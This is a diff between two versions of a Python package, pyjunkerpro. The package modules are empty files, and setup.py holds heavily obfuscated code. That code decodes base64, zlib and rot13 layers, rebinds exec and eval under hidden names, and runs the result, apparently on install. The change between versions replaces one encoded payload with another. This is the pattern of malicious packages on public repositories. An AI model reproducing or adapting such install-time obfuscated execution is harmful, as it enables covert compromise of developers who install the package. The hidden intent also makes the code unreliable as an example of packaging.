# Comparing `tmp/pyjunkerpro-1.0.0.tar.gz` & `tmp/pyjunkerpro-1.0.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyjunkerpro-1.0.0.tar", last modified: Wed Apr 19 14:09:54 2023, max compression
+gzip compressed data, was "pyjunkerpro-1.0.1.tar", last modified: Wed Apr 19 15:07:19 2023, max compression
```

## Comparing `pyjunkerpro-1.0.0.tar` & `pyjunkerpro-1.0.1.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-04-19 14:09:54.675901 pyjunkerpro-1.0.0/
--rw-rw-rw-   0        0        0      207 2023-04-19 14:09:54.674931 pyjunkerpro-1.0.0/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-04-19 14:09:54.666929 pyjunkerpro-1.0.0/pyjunkerpro/
--rw-rw-rw-   0        0        0        0 2023-03-21 20:38:20.000000 pyjunkerpro-1.0.0/pyjunkerpro/__init__.py
--rw-rw-rw-   0        0        0        0 2023-03-21 20:38:30.000000 pyjunkerpro-1.0.0/pyjunkerpro/__main__.py
--rw-rw-rw-   0        0        0        0 2023-03-21 20:38:36.000000 pyjunkerpro-1.0.0/pyjunkerpro/utils.py
-drwxrwxrwx   0        0        0        0 2023-04-19 14:09:54.672937 pyjunkerpro-1.0.0/pyjunkerpro.egg-info/
--rw-rw-rw-   0        0        0      207 2023-04-19 14:09:54.000000 pyjunkerpro-1.0.0/pyjunkerpro.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      217 2023-04-19 14:09:54.000000 pyjunkerpro-1.0.0/pyjunkerpro.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-19 14:09:54.000000 pyjunkerpro-1.0.0/pyjunkerpro.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-04-19 14:09:54.000000 pyjunkerpro-1.0.0/pyjunkerpro.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-19 14:09:54.675901 pyjunkerpro-1.0.0/setup.cfg
--rw-rw-rw-   0        0        0     9095 2023-04-19 14:07:47.000000 pyjunkerpro-1.0.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-19 15:07:19.870339 pyjunkerpro-1.0.1/
+-rw-rw-rw-   0        0        0      207 2023-04-19 15:07:19.869342 pyjunkerpro-1.0.1/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-19 15:07:19.834389 pyjunkerpro-1.0.1/pyjunkerpro/
+-rw-rw-rw-   0        0        0        0 2023-03-21 20:38:20.000000 pyjunkerpro-1.0.1/pyjunkerpro/__init__.py
+-rw-rw-rw-   0        0        0        0 2023-03-21 20:38:30.000000 pyjunkerpro-1.0.1/pyjunkerpro/__main__.py
+-rw-rw-rw-   0        0        0        0 2023-03-21 20:38:36.000000 pyjunkerpro-1.0.1/pyjunkerpro/utils.py
+drwxrwxrwx   0        0        0        0 2023-04-19 15:07:19.867366 pyjunkerpro-1.0.1/pyjunkerpro.egg-info/
+-rw-rw-rw-   0        0        0      207 2023-04-19 15:07:19.000000 pyjunkerpro-1.0.1/pyjunkerpro.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      217 2023-04-19 15:07:19.000000 pyjunkerpro-1.0.1/pyjunkerpro.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-19 15:07:19.000000 pyjunkerpro-1.0.1/pyjunkerpro.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-04-19 15:07:19.000000 pyjunkerpro-1.0.1/pyjunkerpro.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-19 15:07:19.870339 pyjunkerpro-1.0.1/setup.cfg
+-rw-rw-rw-   0        0        0     9108 2023-04-19 15:05:54.000000 pyjunkerpro-1.0.1/setup.py
```

### Comparing `pyjunkerpro-1.0.0/setup.py` & `pyjunkerpro-1.0.1/setup.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,5 +1,5 @@
 import random ,base64,codecs,zlib;pyobfuscate=""
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import re)'],['''u68`843+5x_1;`Z@g%MvO0&rz+(JhPP#lJaPp=iBJO1n<O2|-2+?M?L5825ZuI<_kyFLu812AbNgXVZtZ&<^QGi<Y!Zyit2hm*DGS(vq7e<b&s_=z{)bs%F3ynt{ku-E}ILnDG;m-i6aqGUsucRa6w0|VA}x<gra)!SyDQQMo}%$QDwAM%ES!*y%)A3YPg<it$?eRq5cGBaD0AKze$oTSVJ0ySUQ*>Kcd&clJ&z03iKVhzesiIe0712398)3X_!b%Zi_4+(ga`<P8(3raH}wk-S3B6g+B2oLkAft6|O;`j;jL2ujGZTM$ls5}fXPe4*7MSxMz8D&sB5rx1ceY{kIXJfXEEkT8L|Ga`Mj(@VvO}l}e38g5za|V>USuRvY9+utR9rn}PT_x{tA7XEPLJrZ|_6W(L>}D5<>q9GDhLnEm&Qq#$3H;^GNTPT~W5zdEl^4g8cxaR#w?0kZOOUnzppvbQLAi9Kk;%6@Z#{4cyrPiG?lmcW2epAy93VfohB2o|zPRLE!XT7ontRYV%pk%qMI^gMJ>}9QaW;<7$O?j=lz#V(C@<y&`7m8sA?IWh;r5@R|D}ZVSoufgs(!Til};lKkUzxF7ihYkt4g+#lnSq~F@oD+oa+?>q!Sj$uOT!!Y-b7h6gK6DBbH}tAqL^uVuG>axWd~@)!Zbux@U&JcITtKNLs0$?BFlR6pZj<(|W0z2+F_~q>a*pp;t{CEhuPp3KJ<SoZCB~n1nRdv?<^b`7X??C}kM>ViA@grUhS38YJG;c29ObK_g=LB9AN!l9gLo%kx*|t4`4ix?`t|@TSCtIThUt;aQnmF(i0zq&K*nKjJ_7L9Q<_BQcud!MEBNJP2axt*Z*C9q?3rDwra{WZtNGcwY2}IKB^Tgf1mJ8HAa`g6B&SwP?|(bu#bQIAW&l1gBQqP=FJ8Ls*Pi^frXWWvm)Ahi^;UC#TJs_XS@$T3m~3;>X6didHXXV&cf{yb4rj^nh%vL?={tr$XsynoR8T=VqwS#rn?|XpR-)5U*#bHHrzgHJ<3>w9LCN(;CVa`?g{X`oyY@?FC3HT42-5PTBFtqQ&$_23SJQx2$Eb#KUpw9KkbkH2&Vv9w~a>;}jGh`{CkFHKu4aO4?YXrBBI)4RHwTwAHo<;2!;bX1vyQjFk2_r)DXl8#t1}24+jAQNLM2r?pp`mhEn*uPa%81xzK|4ngHKW4ITfAW_qAD2{CH{dG4t-$^wg7J?|e*fQ3=O*Sgm?xx~AOatB}?jZ3d&^;ElhG4p;&hKMqU1w%$h1R!B<%xO7G*a*gz#}uz1_lZbP0e>YA89pRs)fE<4zjC1?p4RhRu(c&_}g5r&DheCT|_gHH){!2*R(!rHd%X2B=5ROq^7Xt^>2^#&SG#_WEw^yBvcgYw#Q|WyV|vT-9R`yJ8Gz60pN8hGdK#<S=~KTLjaBET%{3A*?Q@1pog{ycoka!P@7?7p9l^J*|%lmxag!a8@L<4l?=(vkKyj%4!}&AXOrLp!p((?GfJ6%_;<ozQ^Cb6f8*~4$S*;Y^n!Q(ewJ!fTBzRyF9kSwZ)&SIeXlJW1}};n3MswQ!Q)}fu*Qf7EEklkM>23bUX&LKV|KtC#1XKAh9x<A!s_wt3emg^(iPhu%x%b~37u~Z2%(j^FYQ)+<CA?s&i$;?1<x^u2yS$3isEXf^f+E%7rm|{7b3*He2PjhZP(US+kTl0G8);1%@Rz_Yj%bL4&Y4lkoNX07N30CGEUviZc9>;Gl%SNk0(bb3YapU{~4DjuCUZ)Z!)3cXkM&$$H>>$R+lxr5++2d*~fYrodQ^rdxul|t|A8bt<M=yL!=RzE%pRN{g}HKur?VZ?^5e2s{IhQT~>Z0e56UWk6Q+0dK%Gyv$TG;FW96iIMOXjybq2!Ex*K=NrTP2Y3PAB{5=@-zpZQ0w^AJzuVY_C@nZYz3OG@i-mW5cZ`WSw0P?dzmVC=qomW}gSz<)f@Jdmwt|zFo@esc-X`=GjK>SBl)r6TP_{~Z$fJiX3n~G3>dRM^1V=(xMOYY1X#Img&qT|!-hFL!%Xr}E@cLr8~ZX8&)UZt|p3zGFWRU<l2>zY{PeNEt+A;7OjmQbwHNQ{a19eBj7?1B;gAr6koFAA8Wom$bY0X{UWr5$DtaOx8=%LJY6??B$bHv^_>qJJ=g-+;<nEq;u@3<0Pt#IMbCffzXbQ>eeA1PeTqcI3z4D#h*s7iU~k_|O+Tnxe~Kosu@7{`bIdUBB~{Fchc07xTFCm?9NrnzG9TvEVwHjT=m3S$pILEK&|Qe>+M_3VDw|QZ_mZ^>AS^G#Gle^6wJ()4NBLpAHc7nBe2mC7het*Q^QL#ma2z&ezHTs1At@wkAOONu5z0BjE|a0>ae7!zWiUo*4n@w1gE)S?lvBQNH-28bPev3a)|D#k-QUAmPZgq2U;yquyZz+37ZVs<Ao<as+y&VoUm9+^T^c*f_n4A+y0ZGeWMF0t0C3{6jDJF9ykPf`UU@hYxn?=T(vH8434WjSqzK>)id`YiHz$rE3SOG4`TFHB!HmeU$sI^I4c+JC{(T=lz8(7oUS(qqYb>B~A|M2-zi6+`UqE=i|?=#k}v9y;@hHIwkW1@J4g3r718;guU-VajM8R%DL{D;_gU|RqSb76H7Fs&DUE#71eV7'''.replace('\n','')]))
+obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import codecs)'],['''{a(~%{Da^ghK8CjKLtR=m*7QIG*KyS%xjM$=7=*=u0d0vpYXO}USu5ZUK?VA9P!{LM@#=q2bGjfm7A9O3Qd))5)Py0f8CN46gh2j6$RU`n8gHun#ItXy3>?kT`|XaCZ2wm<ut;|j;c}g7SNgImPHaU3x(*BF&uJsZ{*?`^P^s6hOk`TVg3BYGH1AV(Bs;#8!QY+XM5-1<IhaoS}-K*d8QEQwNG~Hq^leOPM2_oxGQ#|Eafy|l6Ec9*V;I&u`wg%!9w2GE6t5lo9q_aKcUyEKK>Vvr!f2bOgg~odd}PC&rLB8cyA?r+%l*<3~breEMA*S1W(F5O4KSOW{&WF*b$F~JWC-y&vr(Pzvs8*w&Btn*}ilwWn*R?Pox{sqD2q?aS=|!9B8eEQJdR6UsPpxx6d}x#Wi5&&eSo&kdl%JC^w)fUz+}dQ<AGc*=_D9rShfIGRg+nZVkgAqJL@1K(;btlEgqhwwSXX(KzQaL|B9O`w}?qULCdDn5dL~`GXh!;dGi*2y7QTmR7)-57nHWOve>$j{RI(YBd58U$fw{lDV(*WabIJMgP2HRP#*=7A%uF|6)x)N=kcPH(Bf}C>3MnT`Ta*a)BTE+ZC+NZs#x|2EVjo(=sVJ;{R3Zj#8a$<%rgM!*c64v{%5yNOwD&_fFW}Z<Rszr7%H*HU5k9EgV8ERwJ70(_hhw&|YY&RLxL|b*A?JX%HJBU<6>WzM&KZD)5K@FNB0_43Fd|bgS)=e~2&|0cV%SvN#nG;hN+`v)p(JnN&_-JzMl~5zTSnIT)B8ma0i@rpaZL$v8>GECM3OAFc5AUe1{wI_*zeBVwN+Ca?EWt0qR)95pcGZA@@=Fmu}MvRgzqkGVNP5O<uM|7Kf8Bptw+0?aBRohZCf0!s*i!Tr#^M9rSQo*{l(5Ui5R{R|zG<6_fx@hn+}PVs;N{9egQpx1zCujs?I=nwcBnnWc5vVa}rAbqYQ-X~Fd6+K?=A!|>MnB@v-$XXxljq(cYt4h+w-ys76s?q8$6|`N&LwqMipH+k$7`;7N)_pAYLik6d{w4{CDQ2x|fpYgT_&7iT{qf2&A07Ra*|jf?T9+^PccAcfzxm_M^U0Z|@_+;lKm*T9mb}o*Aq>3S#ttG||8A51SZT%=SxR>+HnhBQefoh62BB{I5XJxlORaUK=W;bQF)I|Q;IB1^hS8+rA@*xiv#CBL^8;NQmzz7sE}1*pXFt|Qf|H?fQi9&)M)<rEDbSxK@y3tD%#vsH79QKif(yFo+TSJ9;2><)l*~_o#IMlsQkM7n@-mlx$yH-}RZ_2GSZ$V520CGsN-@-yte7nZb&qO3#E^Xw9TfL*+V4u1Af=?|XBb4gPDY%$=udd_0uioN&gbmiz?Gr!e43avrS62X4YZcc9J08~NgTOuJ&GrYxN7Lvbe*NKFVWoX&(KpC^wJ@9u>pzQ{DMYsSI)8~?5wH8$<T-#IJ|rf7_CIu^XBN;oh{eQ6KuQ6esmo2w~{NCSl_l5{1vUU#nkqR-U*aPuxjp%V+VLS7BQ{ZDVQ2EKec%ivc(2$pwvrDr2$(q4$qxv1|)BMGJVE7Rz$amH$CK!kg9=SskbTz*N4`(J6wmB;DTE@2q{o9EO9XYIpv73l&5dzsr~fIL=$%Vbr|j8J3y<H!N9X2*l{1fto`?_8kwZoDKe}GXYk&Vw?$WlHYR0IWxJLcm`~$Te1G!P0A&p$qR8nb+#O=vXmY|v8oI=%0qwGP^NogUYxUSzEdp6G4d~XZS}5%b&HTI3hS>^2`Qa-IoXEuvdCkE5>x%B|tuj-Ms_d68qcq9eYV<*ER&9RYa<8t|Czr5?Yc2*}Enn!k={kP*_Hz%Btn5Uwg~8JJ!7q@)vS7tHqA4^69(A<;I@Lf9yv;&AkZ|!gkNHYR8-JD)rzQmwW38nj<FO|TAT51_kgv|P3pr_XO%{7}Zk%)Bk}DPwJ_qu;jSUcEhH330KEan#!A%>8>@P;4$@iun7vv#x=;N%#q&eJuiv)hu>2}J;#}d#80eiB6K50^3l#gEu3POX7=UOl-2IXl^mw#~#dS2$7xff1ra6VgK(H5ePg6zlG?1r0z=qCqjlN9?kk<)&s2Mfuy<GpA55mwvex3(wh&g%Bm6mTeKCeIyf@cWDxP5Xf*V<&B$hr?K1QlyDqePG3>dJBc9nYv;V)hVXI{wU(58wJtEv(2|E@Pp>$SU%sy-+docVRnJYG@4=DjA<jQBjWVybIOQJ53`rm1UsQj6u65%BdIRQLf3Oj#E2z#M3{)iKGf1M8>oArMdve0EzJ3_T>pemEKb{%&h_>re<NEWL3~MuoY&g!_C!q?YZ0eLt$S;!_W;&0)^<o-uq~c5fH%4RsK6v@`MsQ3W!z6K=&#Pk+syMQ?{Fm0E2HR;Q*HC?mjm7!p7e~wiCQ{@?J_A83GC>dbQLysDNdbNZ2T0rBf6o6lWH=l-HE^SvnuA>WB({7Qc+DPqo#Q+2zyjZo${<&hN+f~;asTupwXWKBZyEWtFEn$%V#tK9i{3|fy$B-z{`ocDL551#zm}NIGN%i*YO$JwM;wye^2Hi+qt?Dx{Kiufw&?*-p@HL+b)O&F&wQ<4@V7%7Ed2^CnPKwtsJg9@j&58<n5LrjWmT+qxL-gs;srHyv8(TDE>%gT*oa5Rms#1qF7(^epcB'''.replace('\n','')]))
 
 _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
```
